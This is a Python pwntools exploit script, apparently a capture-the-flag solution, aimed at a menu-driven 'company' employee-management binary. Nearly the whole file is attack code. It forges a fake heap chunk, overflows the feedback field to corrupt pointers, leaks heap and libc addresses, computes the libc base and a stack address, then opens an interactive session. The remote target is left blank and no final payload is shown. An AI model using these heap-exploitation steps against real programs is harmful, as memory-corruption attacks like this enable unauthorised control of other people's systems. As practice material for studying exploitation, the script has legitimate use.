#!/usr/bin/python3

from pwn import *

exe = ELF('company_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''


                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('')
else:
        p = process(exe.path)

GDB()
def register(idx, name, pos, salary):
    sla(b">> ", b"1")
    sla(b": ", idx)
    sa(b": ", name)
    sa(b": ", pos)
    sla(b": ", salary)
def fire(idx):
    sla(b">> ", b"2")
    sla(b": ", idx)
def feedback(hr, idx, fb):
    sla(b">> ", b"3")
    sla(b"? ", hr)
    sla(b"? ", idx)
    sa(b": ", fb)
def view(idx):
    sla(b">> ", b"4")
    sla(b"? ", idx)
    

sa(b"name? ",  p64(0x0) + p64(0x61))
register(b"0", b"0"*0x18, b"HR\0", "123")
feedback(b"0", b"0", b"a" * 0x40 + p64(0x404060+0x10))
fire("0")
register(b"1", b"1" * 0x18, b"HR\0", "123")
fire(b"1")

register(b"1", b"1"*0x10 + b"HR\0\0\0", b"HR\0", "123")
feedback(b"1", b"1", b"b" * 0x40 + p64(0x004040a8))
fire(b"1")
register(b"1", b"1" *0x18, b"HR\0", b"1")
view(b"1")
p.recvuntil(b"Feedback: ")
heap_leak = u32(p.recvline(keepends = False).ljust(4, b"\0"))
info("heap leak: " + hex(heap_leak))
feedback(b"1", b"1", b"b"*0x8)
fire(b"1")

register(b"1", b"1"*0x10 + b"HR\0\0\0", b"HR\0", "123")
feedback(b"1", b"1", b"b" * 0x40 + p64(0x403fa0))
fire(b"1")
register(b"1", b"1" *0x18, b"HR\0", b"1")
view(b"1")
p.recvuntil(b"Feedback: ")
libc_leak = u64(p.recvline(keepends = False).ljust(8, b"\0"))
info("libc leak: " + hex(libc_leak))
libc.address = libc_leak - libc.sym['puts']
info("libc base: " + hex(libc.address))
feedback(b"1", b"1", b"b" * 0x8)
fire(b"1")

stack_leak = libc.address + 0x1fe320

p.interactive()
